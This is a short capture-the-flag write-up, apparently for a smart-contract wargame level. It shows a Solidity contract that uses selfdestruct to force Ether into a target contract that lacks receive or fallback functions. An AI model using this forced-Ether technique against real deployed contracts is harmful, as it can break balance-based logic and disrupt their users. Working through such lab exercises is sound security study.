# The goal of this level is to make the balance of the contract greater than zero.

we can see that the contract doesn't handle receiving Eth( using `receive()` or `fallback()`) as there is no code, so trying to send any Eth will fail as the transaction reverts.

Knowledge of certain facts is necessary to pass this level

We have to use selfdestruct on a contract and use this empty contract's address as receiver's address
this way, the transaction won't revert

The solution is as follows:

```solidity
    contract hackForce{
        address payable targetAddr;
        constructor(address _receiverTarget){
            targetAddr = payable(_receiverTarget);
        }
        function attack() public payable {
            selfdestruct(targetAddr);
        }
        function balance() public view returns(uint256){
            return address(this).balance;
        }

        fallback() external{}

        receive() external payable{}
    }
```
